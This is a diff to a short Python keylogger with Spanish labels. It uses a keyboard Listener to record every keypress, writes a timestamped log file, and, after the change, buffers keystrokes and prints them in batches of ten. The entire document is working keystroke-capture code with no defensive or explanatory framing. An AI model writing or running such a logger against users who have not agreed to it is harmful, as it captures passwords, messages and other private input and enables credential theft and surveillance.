@@ -5,27 +5,38 @@ d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
 
 f = open('keylogger_{}.txt'.format(d), 'w')
 
+texto = []
+
+
+def key_count(key):
+    if len(texto) >= 10:
+        textof = ' '.join(texto)
+        print(textof)
+        texto.clear()
+
 
 def key_recorder(key):
-    key = str(key)
 
+    key = str(key)
     if key == 'Key.enter':
-        f.write('\n')
+        texto.append('\n')
     elif key == 'Key.space':
-        f.write(' ')
+        texto.append(' ')
     elif key == 'Key.backspace':
-        f.write('%BORRAR%')
+        texto.append('%BORRAR%')
     elif key == 'Key.ctrl_l':
         f.write('')
     elif key == 'Key.shift':
         f.write('')
-    elif key == "key.esc":
+    elif key == "'\x03'":
         f.write('\n\nSaliendo del keylogger...')
         f.close()
         quit()
     else:
-        f.write(key.replace("'", ""))
+        texto.append(key.replace("'",""))
 
 
-with Listener(on_press=key_recorder) as l:
+
+
+with Listener(on_press=key_recorder, on_release=key_count) as l:
     l.join()
